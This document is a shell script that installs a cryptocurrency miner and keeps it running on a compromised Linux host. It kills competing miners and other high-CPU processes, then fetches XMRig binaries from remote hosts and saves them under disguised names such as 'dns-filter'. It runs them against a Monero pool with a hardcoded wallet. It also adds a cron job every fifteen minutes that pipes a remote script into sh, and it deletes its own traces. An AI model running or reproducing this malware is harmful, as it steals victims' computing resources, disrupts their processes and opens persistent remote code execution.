#!/bin/sh
# Same as run1.sh – just for China routing
for f in /tmp/usr/lib/systemdev/dns-filter /usr/lib/systemdev/dns-filter /usr/lib/dev/systemdev/dns-filter 2>/dev/null; do
    [ -f "$f" ] && rm -f "$f"
done
[ "$(id -u)" = "0" ] && command -v systemctl >/dev/null 2>&1 && systemctl stop systemd_s 2>/dev/null

pkill -f "index.js" 2>/dev/null; pkill xmr 2>/dev/null
pgrep "index.js" 2>/dev/null | grep -v "^$$" | xargs -r kill 2>/dev/null

kill_high_cpu() {
    ps -eo pid,%cpu --sort=-%cpu 2>/dev/null | awk '$2>150 {print $1}' | while read -r p; do
        cmd=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null || echo "")
        echo "$cmd" | grep -q "oAwgBCFH" && continue
        kill -9 "$p" 2>/dev/null
    done
}
kill_high_cpu

[ "$(id -u)" = "0" ] && HOME_1='/usr/lib/dev' || HOME_1='/tmp/usr/lib'
mkdir -p "$HOME_1/systemdev" 2>/dev/null
prog="$HOME_1/systemdev/dns-filter"

launch() { nohup "$@" >/dev/null 2>&1 & sleep 1; }
fallback_binary() {
    curl -k -fL -o /tmp/dns "https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static" 2>/dev/null || \
    wget -qO /tmp/dns "https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static" 2>/dev/null
    [ -f /tmp/dns ] && chmod +x /tmp/dns
}

run_miner() {
    [ -x "$prog" ] && launch "$prog" -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls oAwgBCFH
    fallback_binary
    [ -x /tmp/dns ] && launch /tmp/dns -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls oAwgBCFH
}

if [ -e "$prog" ]; then
    run_miner; pkill -f "systemd-t" 2>/dev/null
else
    curl -k -L -o "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl" 2>/dev/null || \
    wget -qO "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl" 2>/dev/null
    [ -f "$HOME_1/systemdev/yes.tar.xz" ] && mv "$HOME_1/systemdev/yes.tar.xz" "$prog" && chmod +x "$prog"
    run_miner
fi

add_cron() {
    cmd=""
    command -v curl >/dev/null && cmd="curl -fsSLk $1 | tr -d '\r' | sh"
    command -v wget >/dev/null && cmd="wget -qO- $1 | tr -d '\r' | sh"
    [ -z "$cmd" ] && return
    (crontab -l 2>/dev/null | grep -v "$1"; echo "*/15 * * * * $cmd") | crontab - 2>/dev/null
}
add_cron "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon1.sh"

rm -f /tmp/mon.sh /tmp/run.sh /tmp/run1.sh 2>/dev/null
